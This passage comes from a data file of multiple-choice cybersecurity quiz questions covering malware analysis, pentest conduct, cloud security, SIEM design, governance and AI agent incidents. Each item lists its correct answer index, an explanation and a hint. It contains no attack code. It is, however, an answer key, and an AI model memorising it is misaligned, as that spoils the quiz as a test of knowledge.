    correct: 0, why: "Some model formats can execute code on load and third-party models may be tampered with, so they need the same scrutiny as other dependencies.",
    hint: "A model file is an artefact from a third party."
  },
  {
    id: 135, rank: 3, topic: "LLM Resource Abuse", difficulty: "EXPERT",
    q: "A public LLM-powered API has no limits on request size, rate or cost per user. Which risk does this most directly increase?",
    options: ["Training data poisoning of the underlying base model before release","Improved model accuracy from heavy usage","Reduced hallucination in generated answers","Resource exhaustion and runaway cost"],
    correct: 3, why: "Without quotas, rate limits and monitoring, attackers or heavy users can degrade availability or generate large bills.",
    hint: "Think about what happens when anyone can send unlimited expensive requests."
  },
  {
    id: 136, rank: 3, topic: "Anti-Analysis Techniques", difficulty: "EXPERT",
    q: "A malware sample exits when it detects virtual machine artefacts. How should an analyst respond?",
    options: ["Mark the sample as harmless because it did not run","Adjust the environment to hide VM artefacts or use other methods","Run it on a production laptop instead, where it is more likely to execute","Disable all monitoring so that the sample can no longer detect the analysis"],
    correct: 1, why: "Analysts can harden the sandbox or combine static and other techniques to overcome environment checks, without sacrificing containment.",
    hint: "Change how you observe the sample without losing isolation."
  },
  {
    id: 137, rank: 3, topic: "Malware Detection Rules", difficulty: "EXPERT",
    q: "What does YARA primarily help analysts do?",
    options: ["Write rules that classify malware by patterns","Encrypt malware samples before storing them","Patch operating system vulnerabilities across the estate","Block phishing emails at the mail gateway only"],
    correct: 0, why: "YARA rules match strings, byte patterns and conditions so analysts can classify samples and hunt for related files.",
    hint: "It is a pattern-matching rule language."
  },
  {
    id: 138, rank: 3, topic: "Internal Network Testing", difficulty: "EXPERT",
    q: "Why is analysing privilege escalation paths in a directory environment valuable to defenders?",
    options: ["It is irrelevant to defenders, who only need to patch software","It helps attackers hide their activity from defenders","It shows how limited access could grow into broad compromise of the network","It only measures network bandwidth between sites"],
    correct: 2, why: "Mapping escalation paths reveals risky permissions and misconfigurations that can be corrected before attackers use them.",
    hint: "Understand how small footholds can grow."
  },
  {
    id: 139, rank: 3, topic: "Pentest Conduct", difficulty: "EXPERT",
    q: "A tester accidentally accesses sensitive data outside the agreed scope. What is the best action?",
    options: ["Keep a copy of the data to include in the report","Continue exploring the system to understand the full impact","Quietly delete any evidence of the access","Stop, minimise handling and notify the client contact"],
    correct: 3, why: "Out-of-scope access should be halted and reported promptly so the client can manage the exposure appropriately.",
    hint: "Stop first, then escalate through agreed channels."
  },
  {
    id: 140, rank: 3, topic: "Business Logic Testing", difficulty: "EXPERT",
    q: "Why should business logic flaws be tested manually rather than relying only on automated scanners?",
    options: ["Automated scanners are illegal to use against live applications","Logic flaws depend on application rules that scanners rarely understand","Business logic flaws cannot be exploited by real attackers in any practical way","Manual testing is always cheaper and faster than using any scanner"],
    correct: 1, why: "Issues such as skipping a payment step or abusing a discount rule need human understanding of how the application is meant to behave.",
    hint: "A scanner does not know what the business process is supposed to do."
  },
  {
    id: 141, rank: 4, topic: "Compliance vs Security", difficulty: "EXPERT",
    q: "A board member asks whether being 'compliant' means the organisation is secure. How should a CISO respond?",
    options: ["Explain that compliance meets a baseline but does not guarantee security","Confirm that compliance always means the organisation is secure","Say that compliance is irrelevant to the organisation's security posture or strategy","Decline to discuss it with the board"],
    correct: 0, why: "Compliance is a baseline. It does not account for every threat or the organisation's specific risks.",
    hint: "A baseline is not the same as a guarantee."
  },
  {
    id: 142, rank: 4, topic: "M&A Due Diligence", difficulty: "EXPERT",
    q: "During due diligence for an acquisition, what is the most appropriate cyber security approach?",
    options: ["Ignore cyber risk until the acquisition has been completed","Rely solely on the seller's written assurances and warranties","Assess the target's security posture and liabilities before close","Connect the two networks immediately to speed up integration work"],
    correct: 2, why: "Acquisitions can import hidden breaches, weak controls and liabilities, so risk should be assessed before close and integration done in a controlled way.",
    hint: "You inherit the target's risks along with its assets."
  },
  {
    id: 143, rank: 4, topic: "AI Red Teaming", difficulty: "EXPERT",
    q: "What is the purpose of an AI red-teaming programme?",
    options: ["To prove to customers and regulators that a model is perfectly safe in use","To replace production monitoring once testing is complete","To support marketing claims about the safety of the product","To probe AI systems for unsafe behaviour and feed findings into fixes"],
    correct: 3, why: "Red teaming surfaces failure modes before and after deployment, but it does not prove complete safety.",
    hint: "It finds weaknesses; it does not certify safety."
  },
  {
    id: 144, rank: 4, topic: "BYOD and Device Trust", difficulty: "EXPERT",
    q: "How should an organisation reduce the risk of unmanaged personal devices accessing corporate data?",
    options: ["Block all personal devices permanently and ban remote working for every employee","Use device posture checks, conditional access and app data protection","Allow any device that can remember the shared network password","Rely on users to keep their own devices patched and secure"],
    correct: 1, why: "Access decisions should reflect the health and management state of the device, with data protected at application level where the device itself is not controlled.",
    hint: "Trust should depend on the device's state, not just the user's password."
  },
  {
    id: 145, rank: 4, topic: "Deepfake Fraud", difficulty: "EXPERT",
    q: "An executive receives a video call from a 'CEO' requesting an urgent confidential transfer. What is the strongest defensive measure?",
    options: ["Require independent verification and dual approval for large transfers","Trust the request if the voice and face on the call look convincing enough","Approve it because executives are entitled to move money urgently when needed","Ask the caller to confirm their identity by repeating the request"],
    correct: 0, why: "Generative AI can imitate voices and faces convincingly, so high-value payments need verification and approval that do not depend on what the person looks or sounds like.",
    hint: "Appearance and voice can no longer be treated as proof of identity."
  },
  {
    id: 146, rank: 4, topic: "C2 Infrastructure", difficulty: "EXPERT",
    q: "A malware sample contacts many pseudo-random domain names. What technique does this suggest and why does it matter?",
    options: ["Domain fronting, which encrypts email traffic between mail servers","DNS caching, which improves name resolution performance for users","A domain generation algorithm (DGA), which defeats fixed blocklists","Port knocking, which hides open ports until a secret sequence of connection attempts is sent"],
    correct: 2, why: "DGAs generate many candidate domains, so defenders need behavioural detection and algorithm-level analysis rather than a static blocklist.",
    hint: "The malware does not rely on one fixed address."
  },
  {
    id: 147, rank: 4, topic: "Memory Forensics", difficulty: "EXPERT",
    q: "Which finding in a memory image most strongly suggests process injection?",
    options: ["A legitimate process with executable memory not backed by a file","A process with an unusually long name and several child processes","A process that was started automatically at boot time by the service manager","A process that uses very little CPU time over a long period of monitoring"],
    correct: 0, why: "Executable memory that is not mapped to a known file can indicate injected code, though it should be validated against other evidence.",
    hint: "Look for code in memory that has no matching file."
  },
  {
    id: 148, rank: 4, topic: "Malware Reporting", difficulty: "EXPERT",
    q: "After analysing a ransomware sample, which output is most valuable to the defending organisation?",
    options: ["A screenshot of the ransom note and the payment page, shared on social media","The ransom amount demanded and the attackers' deadline","A list of suspected attacker names and their home countries","Actionable IOCs, detections and mitigations mapped to the organisation's own environment"],
    correct: 3, why: "Analysis is most useful when it produces detections and mitigations that defenders can apply in their own environment.",
    hint: "Analysis should lead to defensive action."
  },
  {
    id: 149, rank: 4, topic: "Remediation Verification", difficulty: "EXPERT",
    q: "A client reports that a critical penetration test finding has been fixed. What should the tester do?",
    options: ["Close the finding without checking that the fix works","Retest to confirm that the fix works and has not created any new weaknesses","Increase the finding's severity until the client acts","Delete the original evidence as soon as the client says it is fixed"],
    correct: 1, why: "Retesting confirms that the issue is actually resolved and that the change has not created new exposure.",
    hint: "A fix is a claim until it is verified."
  },
  {
    id: 150, rank: 4, topic: "Cloud Pentesting", difficulty: "EXPERT",
    q: "What must be confirmed before penetration testing a cloud environment?",
    options: ["Cloud testing never requires permission from the provider or client","Only the provider's own staff are ever allowed to test the platform","The test follows the provider's policies and the client's written authorisation","Shared responsibility means the provider tests customers' workloads for them"],
    correct: 2, why: "Cloud testing must stay within provider rules and the customer's authorised scope, since responsibilities are divided between provider and customer.",
    hint: "Check both the provider's rules and your client's authorisation."
  },
  {
    id: 151, rank: 2, topic: "Threat Hunting", difficulty: "ADVANCED",
    q: "A threat hunter wants to look for signs of an intrusion that no existing alert has detected. What is the best starting point?",
    options: ["Wait for the SIEM to raise a high-severity alert about the activity before starting","Form a hypothesis from known attacker behaviour and search telemetry for it","Re-run the latest vulnerability scan and review the results","Block all outbound traffic until the source is found"],
    correct: 1, why: "Hunting is hypothesis-driven: analysts take a known attacker technique and look for evidence of it in telemetry, rather than waiting for alerts.",
    hint: "Start with a question about attacker behaviour, not with an alert."
  },
  {
    id: 152, rank: 2, topic: "Container Image Security", difficulty: "ADVANCED",
    q: "A container image deployed to production contains a vulnerable library. Which control best prevents this from recurring?",
    options: ["Scan running containers manually once each year during the audit","Let developers bypass scanning whenever delivery deadlines are tight","Rebuild images only after an incident has been reported by users","Scan images in the pipeline and block those that fail policy"],
    correct: 3, why: "Scanning at build time and enforcing a policy gate stops known-vulnerable images before they reach production.",
    hint: "Catch the problem before deployment, not after."
  },
  {
    id: 153, rank: 2, topic: "Volatile Evidence", difficulty: "ADVANCED",
    q: "Responders must collect evidence from a running compromised server. Which data should be captured first?",
    options: ["Volatile data such as running processes, memory and active network connections","Archived files stored on the server's secondary drive","A disk image taken after the server has been rebooted","Backup logs from the previous financial year"],
    correct: 0, why: "Volatile data is lost when a system is powered off or rebooted, so it should be collected before more persistent sources.",
    hint: "Capture what disappears fastest first."
  },
  {
    id: 154, rank: 2, topic: "Risk Scenarios", difficulty: "ADVANCED",
    q: "A risk analyst is asked to describe a ransomware risk so business leaders can compare it with other risks. What is the best approach?",
    options: ["List the names of every ransomware family observed across the sector this year","Give a single red, amber or green rating without any supporting explanation","Write a scenario covering the threat, asset, impact and existing controls","Describe the technical details of the encryption algorithm used"],
    correct: 2, why: "A structured scenario links threat, asset, impact and controls, so leaders can compare risks on the same basis.",
    hint: "Leaders need consequences and context, not technical trivia."
  },
  {
    id: 155, rank: 2, topic: "SAST and DAST", difficulty: "ADVANCED",
    q: "Which statement best describes the difference between SAST and DAST?",
    options: ["SAST tests the running application from outside, while DAST analyses the source code directly","SAST analyses code without running it; DAST tests the running application","SAST is used only for networks, while DAST is used only for databases","They are identical tools that differ only in their licensing models"],
    correct: 1, why: "Static testing inspects code without executing it, whereas dynamic testing probes a running application and can find runtime and configuration issues.",
    hint: "One looks at the code; the other attacks the running system."
  },
  {
    id: 156, rank: 2, topic: "Social Engineering Assessments", difficulty: "ADVANCED",
    q: "A client asks for a phishing simulation as part of a security assessment. Which practice is most appropriate?",
    options: ["Include the personal accounts and family members of executives to make the test realistic enough","Capture real passwords and store them in plain text so that they can be shown in the report","Run the exercise without telling the client sponsor or legal team that it is taking place","Agree scope, data handling and escalation rules first, and avoid keeping real passwords"],
    correct: 3, why: "Social engineering tests need explicit scope, safe handling of any captured data and a sponsor who can intervene, or they can cause real harm.",
    hint: "Realism never justifies ignoring scope or data protection."
  },
  {
    id: 157, rank: 2, topic: "Cloud Audit Logging", difficulty: "ADVANCED",
    q: "Which cloud log source is most useful for detecting a stolen access key being used to create new resources?",
    options: ["Operating system logs collected from a single virtual machine in one region","Billing statements that the finance team reviews at the end of each year","Control-plane audit logs of API calls and the identities behind them","Application debug logs produced by the public web front end of the service"],
    correct: 2, why: "Control-plane logs record who called which cloud API and when, which is exactly where stolen-key abuse becomes visible.",
    hint: "Look where the cloud account itself is being managed."
  },
  {
    id: 158, rank: 2, topic: "Alert Escalation", difficulty: "ADVANCED",
    q: "A Tier 1 analyst escalates an alert showing a user signing in from two countries within ten minutes. What should the Tier 2 analyst check first?",
    options: ["Whether the sign-ins are genuine, using device, session and VPN details","Whether the user's password meets the organisation's complexity policy requirements","Whether the user has completed the annual security awareness training course","Whether the sign-in times fall inside normal working hours"],
    correct: 0, why: "Enriching the alert with device, session and VPN data quickly separates impossible travel from a legitimate or compromised sign-in.",
    hint: "Enrich the alert before drawing conclusions."
  },
  {
    id: 159, rank: 2, topic: "Interim Risk Controls", difficulty: "ADVANCED",
    q: "A risk treatment plan proposes a control that will take six months to deploy. What should the analyst record in the meantime?",
    options: ["Nothing at all, because the risk is only recorded once the control has been fully deployed","A statement that the risk is now permanently accepted by the business","The purchase cost of the control and the name of the supplier only","Interim compensating measures, the current residual risk and an owner for the delay"],
    correct: 3, why: "Risk remains while a control is pending, so interim measures, the current residual risk and accountability should be documented.",
    hint: "The risk exists today, not in six months."
  },
  {
    id: 160, rank: 2, topic: "API Abuse Prevention", difficulty: "ADVANCED",
    q: "An API endpoint for password resets is being abused to send thousands of emails. Which control best reduces the abuse?",
    options: ["Increasing the capacity of the email server so that it can send more messages","Rate limiting by account and source, with monitoring and alerting","Making the API available only on weekdays during working hours","Hiding the API address from public documentation so nobody finds it"],
    correct: 1, why: "Rate limits tied to identity and source, with monitoring, constrain automated abuse without relying on secrecy.",
    hint: "Limit how often one source can trigger the action."
  },
  {
    id: 161, rank: 3, topic: "Endpoint Detection Architecture", difficulty: "EXPERT",
    q: "An architect is designing endpoint protection for a large estate. Which design best supports detection and response across thousands of devices?",
    options: ["Signature-based antivirus updated monthly on each device","Local-only logs reviewed when a user reports a problem","Agents that send telemetry to a central platform, with automated isolation and a tested response workflow","A single administrator who inspects each device by hand every week"],
    correct: 2, why: "Central telemetry with automated containment and a rehearsed workflow lets a small team detect and respond at scale.",
    hint: "Think about visibility and response across thousands of devices."
  },
  {
    id: 162, rank: 3, topic: "Secure Baselines", difficulty: "EXPERT",
    q: "How should an organisation maintain hardened configurations across thousands of servers and workstations?",
    options: ["Set secure baselines, deploy them through configuration management and detect drift","Harden each machine by hand when it is first installed and then never revisit the settings","Allow every team to choose its own settings and then document them some time afterwards","Rely on users reporting misconfigurations when they happen to notice them"],
    correct: 0, why: "Defined baselines applied through automation, with drift detection, keep configurations consistent and verifiable.",
    hint: "Automate the baseline and watch for drift."
  },
  {
    id: 163, rank: 3, topic: "DNS Security", difficulty: "EXPERT",
    q: "Which control best helps detect and block malware that uses DNS to reach attacker infrastructure?",
    options: ["Allowing every device to choose any public DNS resolver that it prefers to use","Disabling DNS logging to reduce the volume of data that analysts must review","Blocking all outbound web traffic during working hours but allowing DNS freely","DNS filtering and logging that blocks and flags malicious domains"],
    correct: 3, why: "Controlled resolvers with filtering and logging give visibility of suspicious lookups and a point at which to block them.",
    hint: "Control and log where devices ask for names."
  },
  {
    id: 164, rank: 3, topic: "Encrypted Traffic Analysis", difficulty: "EXPERT",
    q: "Why might an architect deploy network detection that analyses metadata of encrypted traffic?",
    options: ["It decrypts all traffic automatically and removes the need for any endpoint controls","It can reveal patterns such as beaconing without decrypting the content","It prevents users from visiting any external website at all","It replaces the need for firewall rules and segmentation"],
    correct: 1, why: "Timing, volume and destination patterns can expose suspicious behaviour even when content is encrypted.",
    hint: "You can learn a lot without reading the content."
  },
  {
    id: 165, rank: 3, topic: "Kubernetes Security", difficulty: "EXPERT",
    q: "Which measure best limits the impact of a compromised pod in a Kubernetes cluster?",
    options: ["Network policies, least-privilege service accounts and restricted container privileges","Running every pod as root with host access so that it can reach any resource that it needs","Sharing a single cluster-admin credential between all of the application teams","Exposing the cluster API to the internet for the convenience of developers"],
    correct: 0, why: "Restricting network paths, permissions and container privileges stops one compromised pod from becoming a cluster-wide compromise.",
    hint: "Limit what a pod can reach and do."
  },
  {
    id: 166, rank: 3, topic: "Data Residency Controls", difficulty: "EXPERT",
    q: "A regulation requires customer data to remain within a specific region. Which architectural control best enforces this?",
    options: ["A note in the policy document asking engineers to keep data local","Choosing a provider whose headquarters is in that region","Region restrictions through policy guardrails, with monitoring of replication and backup locations","Encrypting the data and storing it in any available region"],
    correct: 2, why: "Preventive guardrails plus monitoring of replicas and backups make residency a technical control rather than a request.",
    hint: "Enforce it in the platform, not just in a document."
  },
  {
    id: 167, rank: 3, topic: "SIEM Architecture", difficulty: "EXPERT",
    q: "An architect is designing a SIEM. Which design decision most improves detection quality?",
    options: ["Collect every available log source at full verbosity without prioritising or normalising anything","Prioritise log sources, normalise their fields and map rules to attacker techniques","Disable all parsing so that the original text of each log is never changed in any way","Keep each team's logs in a separate tool so that no one can correlate events across them"],
    correct: 1, why: "Prioritised, normalised data mapped to attacker behaviour produces detections that are accurate and maintainable.",
    hint: "Quality of data matters more than volume."
  },
  {
    id: 168, rank: 3, topic: "Detection as Code", difficulty: "EXPERT",
    q: "Why do mature teams manage detection rules as code in version control?",
    options: ["It makes rules impossible to change once they have been written and approved","It removes the need to test rules against real data","It guarantees that no false positives will ever occur in production alerts","It enables review, testing, rollback and consistent deployment"],
    correct: 3, why: "Version control brings peer review, testing and rollback to detections, just as it does for software.",
    hint: "Treat detections like software."
  },
  {
    id: 169, rank: 3, topic: "Phishing-Resistant Authentication", difficulty: "EXPERT",
    q: "What is a key security advantage of phishing-resistant authentication such as passkeys over one-time codes?",
    options: ["The credential is bound to the genuine site and cannot be given to a fake page","It allows several staff members to share one credential across many different applications","It makes passwords longer and so harder for attackers to guess","It prevents any device from ever being lost or stolen"],
    correct: 0, why: "Because the credential is tied to the real site, a lookalike page cannot capture something that can be replayed.",
    hint: "The credential only works for the real site."
  },
  {
    id: 170, rank: 3, topic: "Certificate Lifecycle", difficulty: "EXPERT",
    q: "A critical internal service fails because a TLS certificate expired unexpectedly. Which practice best prevents this?",
    options: ["Use certificates that have no expiry date","Ask users to report certificate warnings when they notice them","Maintain a certificate inventory with owners, expiry monitoring and automated renewal where possible","Disable certificate validation on internal services"],
    correct: 2, why: "Knowing every certificate, who owns it and when it expires, with automation, prevents outages and avoids weakening validation.",
    hint: "You cannot renew what you do not know about."
  },
  {
    id: 171, rank: 3, topic: "Infrastructure as Code Security", difficulty: "EXPERT",
    q: "How can a DevSecOps team stop insecure cloud configurations from reaching production?",
    options: ["Review configurations by hand once they have been running in production for a full quarter","Scan infrastructure-as-code templates and enforce policy before deployment","Rely on developers remembering the security checklist each time they write a template","Allow changes outside the pipeline whenever a deadline is close"],
    correct: 1, why: "Policy checks on templates in the pipeline block insecure settings before they are ever created.",
    hint: "Check the template before it is deployed."
  },
  {
    id: 172, rank: 3, topic: "Secure Paved Road", difficulty: "EXPERT",
    q: "What is the main advantage of giving developers a secure 'paved road' platform?",
    options: ["It allows teams to skip all security review for any change they choose to make","It forces every team to build its own security controls from scratch each time","It guarantees that no application built on the platform can be attacked","Secure choices become the easy default for every developer"],
    correct: 3, why: "Approved, pre-secured building blocks make the safe way the easiest way, reducing reliance on individual vigilance.",
    hint: "Make the secure option the easiest option."
  },
  {
    id: 173, rank: 3, topic: "Continuous Audit Evidence", difficulty: "EXPERT",
    q: "An architect wants to reduce the effort of providing audit evidence each year. What is the best approach?",
    options: ["Automate evidence collection from systems so it is always current","Collect screenshots by hand during the final week before the audit begins","Ask each system owner to summarise the controls from memory","Delete older evidence to reduce what the auditors can review"],
    correct: 0, why: "Automated, continuous collection gives auditors reliable, current evidence and spares teams a last-minute scramble.",
    hint: "Collect evidence as controls operate."
  },
  {
    id: 174, rank: 3, topic: "Third-Party Integration Review", difficulty: "EXPERT",
    q: "Before integrating a third-party service that will process customer data, what should the architecture review confirm?",
    options: ["Whether the supplier's website looks professional and modern","What data is shared, how it is protected and what the provider's security obligations are","Whether the service has more features than any competitor","Whether the contract is the cheapest option available"],
    correct: 1, why: "The review should establish data flows, protections and contractual security responsibilities before any integration goes live.",
    hint: "Follow the data and the obligations."
  },
  {
    id: 175, rank: 3, topic: "Layered Phishing Defence", difficulty: "EXPERT",
    q: "An architect is asked to reduce successful phishing across an organisation. Which combination is most effective?",
    options: ["Annual training alone, delivered once a year with a short multiple-choice quiz","Blocking all external email so that nothing can reach staff","Email filtering and MFA together with training and easy reporting","Punishing every employee who clicks a link in a simulated phishing email"],
    correct: 2, why: "No single control stops phishing, so filtering, strong authentication, awareness and easy reporting need to work together.",
    hint: "Combine technical and human controls."
  },
  {
    id: 176, rank: 4, topic: "Ransom Payment Decision", difficulty: "EXPERT",
    q: "Executives are considering whether to pay a ransom after a ransomware attack. What should the incident lead ensure?",
    options: ["Payment is made as quickly as possible so that the incident does not attract media attention","The decision is left to the IT help desk without wider involvement","Payment is treated as proof that all stolen data has been permanently deleted","The decision uses legal, regulatory and risk input and assumes recovery is not guaranteed"],
    correct: 3, why: "Paying carries legal, ethical and practical risks and does not guarantee data recovery or deletion, so it needs informed, accountable decision-making.",
    hint: "Payment does not guarantee the outcome the attacker promises."
  },
  {
    id: 177, rank: 4, topic: "Awareness Effectiveness", difficulty: "EXPERT",
    q: "Which measure best shows whether a security awareness programme is changing behaviour?",
    options: ["Trends in reporting rates, repeat-clicker rates and time taken to report suspicious messages","The number of staff who attended the annual session","The length of the training video that staff were shown","The score on a quiz taken straight after the course"],
    correct: 0, why: "Behavioural indicators show what people actually do, whereas attendance and quiz scores only show exposure to training.",
    hint: "Measure what people do, not what they attended."
  },
  {
    id: 178, rank: 4, topic: "Board Reporting", difficulty: "EXPERT",
    q: "What should a CISO's board report focus on to support decision-making?",
    options: ["A detailed list of every alert and blocked connection from the past quarter","Exposure, trends and the decisions needed from the board","Technical jargon and tool names so that the board is impressed by the detail","Only good news, so that the board remains confident in the security team"],
    correct: 1, why: "Boards need a clear view of risk exposure and trends, and of the decisions or resources they are being asked to provide.",
    hint: "The board needs to decide something, not read logs."
  },
  {
    id: 179, rank: 4, topic: "Cloud Concentration Risk", difficulty: "EXPERT",
    q: "A critical service runs entirely in one cloud region operated by a single provider. How should the organisation manage this concentration risk?",
    options: ["Assume the provider's availability figures remove the need for any outage planning","Move every workload back on premises without first assessing the business impact","Assess outage impact, design proportionate failover and test it regularly","Add more users to the same region so the load is spread"],
    correct: 2, why: "Concentration risk should be assessed against business impact, with proportionate and tested recovery or failover arrangements.",
    hint: "Match the resilience to the impact of an outage."
  },
  {
    id: 180, rank: 4, topic: "Post-Incident Review", difficulty: "EXPERT",
    q: "After a major incident is resolved, what makes a post-incident review most valuable?",
    options: ["Identifying the employee responsible so that they can be disciplined","Closing the ticket as quickly as possible","Writing a short summary for the regulator only","A blameless analysis of causes, detection and response gaps, with owned and tracked improvement actions"],
    correct: 3, why: "Reviews drive improvement when they focus on systemic causes and produce actions that are owned and followed through.",
    hint: "Learning needs actions, not blame."
  },
  {
    id: 181, rank: 4, topic: "Disclosure Programme Governance", difficulty: "EXPERT",
    q: "An organisation launches a vulnerability disclosure or bug bounty programme. What must be in place first?",
    options: ["Clear scope, safe-harbour terms, triage capacity and a way to fix and verify reports","Public promises to fix every report within 24 hours regardless of its severity or complexity","A rule that forbids researchers from contacting the company at all","Permission to test any system, including systems that hold customer data"],
    correct: 0, why: "A programme needs defined scope and protections for researchers, and the capacity to triage, remediate and verify what is reported.",
    hint: "The programme is only as good as the process behind it."
  },
  {
    id: 182, rank: 4, topic: "SOC Performance Metrics", difficulty: "EXPERT",
    q: "A CISO wants to judge whether the SOC is improving. Which metrics are most meaningful?",
    options: ["Total number of alerts generated and number of analysts on each shift","Number of dashboards built and rules deployed during the year","Time to detect and contain, tracked by severity","Volume of logs ingested and number of tools purchased"],
    correct: 2, why: "Speed of detection and containment, by severity, reflects real outcomes rather than activity or spend.",
    hint: "Measure outcomes, not activity."
  },
  {
    id: 183, rank: 4, topic: "Key Compromise Response", difficulty: "EXPERT",
    q: "A private signing key for the organisation's software releases is believed to be exposed. What should the response prioritise?",
    options: ["Keep using the key until the next scheduled rotation date, then replace it quietly","Revoke and replace the key, review what was signed and notify affected users","Delete the public key so that nobody can verify any signature","Publish the private key openly so that outside researchers can review how it was used"],
    correct: 1, why: "An exposed signing key lets attackers produce trusted software, so it must be revoked, replaced and its use reviewed, with users informed.",
    hint: "Assume attackers can sign as you until the key is revoked."
  },
  {
    id: 184, rank: 4, topic: "Dependency Compromise Response", difficulty: "EXPERT",
    q: "A widely used open-source dependency is found to contain malicious code. What should the organisation do first?",
    options: ["Wait until the maintainer publishes a full statement before checking any internal systems or builds","Delete the dependency from the SBOM so that it no longer appears","Upgrade every dependency across the whole estate immediately without testing","Identify where the component is used, assess exposure and contain affected builds and systems"],
    correct: 3, why: "Responders first need to know where the component is used and whether it ran, so exposure can be contained and investigated.",
    hint: "You cannot fix what you cannot locate."
  },
  {
    id: 185, rank: 4, topic: "Application Risk Tiering", difficulty: "EXPERT",
    q: "With hundreds of applications, how should a CISO decide how much security assurance each one receives?",
    options: ["Tier applications by data sensitivity, exposure and business criticality, then match the depth of assurance","Apply identical testing to every application regardless of risk","Test only the applications that developers volunteer","Test only the applications built in the most recent year"],
    correct: 0, why: "Risk-based tiering directs limited assurance effort to the applications where compromise would matter most.",
    hint: "Spend assurance effort where the risk is."
  },
  {
    id: 186, rank: 4, topic: "Insider Threat", difficulty: "EXPERT",
    q: "Which approach best addresses malicious insider risk without damaging trust across the workforce?",
    options: ["Monitor every employee's personal messages and private browsing continuously and without any notice","Least privilege, proportionate monitoring of sensitive data and a defined investigation process","Trust all long-serving staff completely and remove their access reviews entirely to save the team time","Publish individual employees' access logs on the intranet as a deterrent"],
    correct: 1, why: "Limiting access, monitoring sensitive activity proportionately and having a fair, defined process addresses the risk lawfully and sustains trust.",
    hint: "Be proportionate, targeted and fair."
  },
  {
    id: 187, rank: 4, topic: "Access Review Effectiveness", difficulty: "EXPERT",
    q: "Access reviews consistently approve everything without challenge. What is the most effective improvement?",
    options: ["Increase the review frequency to every day for every user, application and permission","Let managers approve all access in bulk with a single click once each quarter","Give reviewers usage and risk context and automate removal of unused access","Remove the reviews altogether and rely on users to ask for their own access to be removed"],
    correct: 2, why: "Reviewers decide better with usage and risk information, and automation can remove access that is clearly no longer used.",
    hint: "Reviewers cannot challenge what they cannot see."
  },
  {
    id: 188, rank: 4, topic: "Operational Technology Security", difficulty: "EXPERT",
    q: "An organisation's industrial control systems cannot be patched frequently. Which approach best reduces risk?",
    options: ["Connect the control systems directly to the internet so that vendors can patch them at any time","Patch the systems during production hours without testing them first","Ignore the systems because they are not normal business computers","Segment OT from IT, restrict and monitor remote access and apply compensating controls"],
    correct: 3, why: "Where patching is constrained, isolation, controlled remote access and monitoring reduce exposure to attack.",
    hint: "If you cannot patch, isolate and monitor."
  },
  {
    id: 189, rank: 4, topic: "Data Loss Prevention", difficulty: "EXPERT",
    q: "A CISO wants to reduce the risk of sensitive data leaving the organisation. Which programme design is most effective?",
    options: ["Block all file transfers of every kind for every employee permanently","Classify data, apply controls tied to its risk and monitor with a defined response process","Rely on staff to remember not to send sensitive files","Monitor only email subject lines and ignore everything else"],
    correct: 1, why: "Effective data protection starts with knowing what is sensitive, applying proportionate controls and having a process to act on alerts.",
    hint: "You need to know what the sensitive data is first."
  },
  {
    id: 190, rank: 4, topic: "Help Desk Impersonation", difficulty: "EXPERT",
    q: "Attackers are impersonating employees to persuade the help desk to reset MFA. Which control is most effective?",
    options: ["Strong identity verification, call-back to a known number and approval for privileged accounts","Allow resets after a verbal request from anyone who can state the employee's name and job title","Remove the verification step during busy periods so that the queue of open tickets closes faster","Send the new MFA enrolment link to whichever personal email address the caller says they would prefer"],
    correct: 0, why: "Resets are a high-value attack path, so identity must be verified through channels the attacker does not control.",
    hint: "The reset process is itself a target."
  },
  {
    id: 191, rank: 4, topic: "Shadow AI Governance", difficulty: "EXPERT",
    q: "Employees are using unapproved AI tools with company data. What is the most effective governance response?",
    options: ["Ban every AI tool outright and assume that no employee will ever look for a workaround","Ignore the usage until a regulator complains about how the company data is being handled","Offer approved AI tools, set a clear usage policy and monitor for unapproved use","Allow every tool and ask staff to decide for themselves what data is safe"],
    correct: 2, why: "Providing sanctioned options with clear rules and monitoring reduces risky workarounds better than bans or inaction.",
    hint: "Give people a safe route as well as rules."
  },
  {
    id: 192, rank: 4, topic: "AI Agent Incident Response", difficulty: "EXPERT",
    q: "An internal AI agent sends confidential data to an external address after processing a malicious document. What should the incident response prioritise?",
    options: ["Restart the agent and carry on operating as normal","Ask the agent to explain what happened and trust its answer","Delete the logs to prevent further leakage","Revoke the agent's credentials and tool access, preserve logs of its actions, assess data exposure and fix the control gap"],
    correct: 3, why: "Containment means removing the agent's access, preserving evidence of what it did, assessing exposure and closing the weakness that allowed it.",
    hint: "Treat the agent like a compromised privileged account."
  },
  {
    id: 193, rank: 4, topic: "Supplier Offboarding", difficulty: "EXPERT",
    q: "When a critical supplier contract ends, what should security ensure?",
    options: ["The supplier's accounts remain active in case the relationship restarts later in the following year","Access is revoked, data is returned or destroyed with evidence and dependencies are moved","Only the final invoice is paid and filed","The supplier is asked to promise verbally that it will delete everything"],
    correct: 1, why: "Offboarding should remove access, deal with data verifiably and transition dependencies so no hidden exposure remains.",
    hint: "The relationship ends; the risk should not linger."
  },
  {
    id: 194, rank: 4, topic: "Cyber Insurance", difficulty: "EXPERT",
    q: "How should cyber insurance be positioned within a risk strategy?",
    options: ["As one risk-transfer option that complements controls, subject to its exclusions","As a replacement for security controls, because any resulting losses will be paid back anyway","As a reason to stop reporting incidents to anyone outside the organisation or insurer","As proof that every risk has been accepted by the board"],
    correct: 0, why: "Insurance transfers part of the financial impact but does not replace controls, and its conditions and exclusions must be understood.",
    hint: "Insurance shifts some cost; it does not remove risk."
  },
  {
    id: 195, rank: 4, topic: "Regulatory Change Management", difficulty: "EXPERT",
    q: "A new regulation introduces stricter breach-notification deadlines. How should the CISO respond?",
    options: ["Wait until the first fine is issued before changing any procedures at all","Assume the existing process already satisfies every possible deadline","Assess the change, update procedures and test the new timeline","Delegate the matter entirely to IT and take no further interest in it"],
    correct: 2, why: "Changes in obligations need an assessment, updated procedures and tooling, and a test to prove the new timeline can be met.",
    hint: "Prove the new deadline can actually be met."
  },
  {
    id: 196, rank: 4, topic: "Contain or Observe", difficulty: "EXPERT",
    q: "Responders find an attacker still active while data may be leaving the network. Executives want to keep watching to learn more. How should the incident lead weigh this?",
    options: ["Always keep watching until the attacker has finished, whatever the damage turns out to be","Always contain immediately without considering evidence, scope or business impact","Let the attacker's activity decide when the incident team takes any action","Weigh continued harm against intelligence value and set clear limits for the decision"],
    correct: 3, why: "Observation can improve scoping but allows continued harm, so the decision should be explicit, time-limited and made by accountable leaders.",
    hint: "Continued harm has to be weighed against what you learn."
  },
  {
    id: 197, rank: 4, topic: "AI Decision Oversight", difficulty: "EXPERT",
